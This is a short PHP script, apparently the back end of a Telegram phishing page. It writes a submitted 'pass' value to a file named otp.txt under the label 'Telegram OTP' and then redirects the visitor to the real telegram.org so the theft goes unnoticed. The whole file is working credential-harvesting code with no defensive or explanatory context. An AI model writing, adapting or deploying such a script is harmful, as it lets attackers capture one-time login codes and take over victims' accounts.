<?php
file_put_contents("otp.txt", "Telegram OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://telegram.org/');
?>
